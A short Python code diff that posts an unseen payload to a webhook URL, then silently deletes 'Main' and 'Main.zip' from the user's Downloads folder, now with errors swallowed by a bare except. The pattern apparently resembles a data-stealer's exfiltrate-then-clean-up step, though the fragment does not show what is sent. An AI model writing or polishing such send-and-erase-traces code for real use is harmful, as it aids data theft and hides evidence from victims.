@@ -45,6 +45,9 @@ payload = {
 }
 
 response = requests.post(webhook_url, json=payload)
-os.remove("%USERPROFILE%\Downloads\Main")
-os.remove("%USERPROFILE%\Downloads\Main.zip")
+try:
+    os.remove(f"C:/Users/{os.getlogin()}/Downloads/Main")
+    os.remove(f"C:/Users/{os.getlogin()}/Downloads/Main.zip")
+except:
+    pass
 time.sleep(0.1)
